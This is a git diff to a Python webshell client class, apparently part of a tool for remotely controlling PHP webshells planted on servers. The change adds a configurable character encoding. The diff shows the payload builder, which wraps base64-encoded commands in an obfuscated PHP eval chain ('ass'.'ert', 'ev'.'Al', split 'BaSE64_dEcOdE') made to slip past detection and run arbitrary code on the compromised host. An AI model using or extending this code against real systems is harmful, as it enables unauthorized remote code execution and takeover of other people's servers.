@@ -12,11 +12,12 @@ class Shell:
         :param plugin: 此webshell采用的插件，默认为plain
         :param method: 数据交互的方式
     """
-    def __init__(self, url, pwd, plugin='plain', method='POST'):
+    def __init__(self, url, pwd, plugin='plain', method='POST', coding='utf-8'):
         self.url = url
         self.pwd = pwd
         self.plugin = plugin
         self.method = method
+        self.coding = coding
         self.plugin_module = None
         self.load_plugin()
         self.headers = {
@@ -26,7 +27,6 @@ class Shell:
         self.current_dir_path = ''
         self.drivers = []
         self.system_info = ''
-        self.coding = ''
         self.separator = ''
         self.get_sys_info()
         self.basic_set()
@@ -41,7 +41,7 @@ class Shell:
 
     def generate_post_data(self, functional_code, filename=''):
         """由功能性代码构造post数据"""
-        b64_functional_code = bytes.decode(base64.b64encode(str.encode(functional_code)))
+        b64_functional_code = bytes.decode(base64.b64encode(functional_code.encode(self.coding)))
         data = r"""array_map("ass"."ert",array("ev"."Al(\"\\\$xx=\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('""" + \
                 b64_functional_code + \
                 r"""'));\");"));"""
@@ -54,7 +54,6 @@ class Shell:
 
     def basic_set(self):
         """确定编码和路径分隔符"""
-        self.coding = 'gbk' if 'windows' in self.system_info.lower() else 'utf-8'
         self.separator = r'\\' if 'windows' in self.system_info.lower() else '/'
 
     def get_sys_info(self):
